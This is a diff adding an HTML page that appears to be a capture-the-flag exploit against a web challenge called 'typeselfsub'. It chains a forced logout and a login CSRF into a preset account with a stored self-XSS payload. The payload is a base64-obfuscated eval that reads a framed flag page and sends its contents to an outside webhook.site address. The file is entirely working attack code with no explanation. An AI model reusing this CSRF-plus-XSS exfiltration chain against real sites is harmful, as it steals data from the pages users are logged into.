@@ -1,0 +1,25 @@
+<!-- ZmV0Y2goJ2h0dHBzOi8vd2ViaG9vay5zaXRlLzRiMjZjNjhmLTJjNzAtNDc0MS1hNmZhLTEyOGI3MWU1NDdmYT9hPScrYnRvYSh0b3AuZnJhbWVzWzBdLmZyYW1lc1swXS5mcmFtZXNbMF0uZG9jdW1lbnQuYm9keS5pbm5lckhUTUwpKQo= -->
+
+
+<html>
+<head>
+</head>
+<body>
+    <iframe id="flag" src="https://typeselfsub.web.ctfcompetition.com/flag">
+    </iframe>
+    <iframe id="logout" src="https://typeselfsub.web.ctfcompetition.com/logout">
+    </iframe>
+    <iframe id="login" srcdoc=' <form action="https://typeselfsub.web.ctfcompetition.com/login" name="fa" method="POST"> <input name="username" value="Non"> <input name="password" value="Non"> <input name="csrf"> </form> '>
+    </iframe>
+    <iframe id="xss" srcdoc=' <form action="https://typeselfsub.web.ctfcompetition.com/me" name="fb" method="POST"> <input name="csrf"> <input name="address" value="<img/src=1 onerror=eval(atob(`ZmV0Y2goJ2h0dHBzOi8vd2ViaG9vay5zaXRlLzRiMjZjNjhmLTJjNzAtNDc0MS1hNmZhLTEyOGI3MWU1NDdmYT9hPScrYnRvYSh0b3AuZnJhbWVzWzBdLmZyYW1lc1swXS5mcmFtZXNbMF0uZG9jdW1lbnQuYm9keS5pbm5lckhUTUwpKQo=`)) >" > </form> '>
+    </iframe>
+    <script>
+        logout.onload=function(){
+            login.onload=function(){
+                xss.contentWindow.document.forms[0].submit();
+            }
+            login.contentWindow.document.forms[0].submit();
+        }
+    </script>
+    </body>
+</html>
